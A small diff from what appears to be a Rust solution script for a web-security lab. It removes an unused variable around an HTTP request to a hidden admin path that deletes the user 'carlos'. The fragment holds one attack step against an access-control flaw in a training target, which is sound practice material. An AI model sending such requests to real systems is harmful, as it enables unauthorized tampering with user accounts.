@@ -75,7 +75,7 @@ fn main() {
     io::stdout().flush();
 
     // delete carlos
-    let delete_carlos = client
+    client
         .get(format!("{url}{hidden_path}/delete?username=carlos"))
         .send()
         .expect(&format!("{}", "[!] Failed to delete carlos".red()));
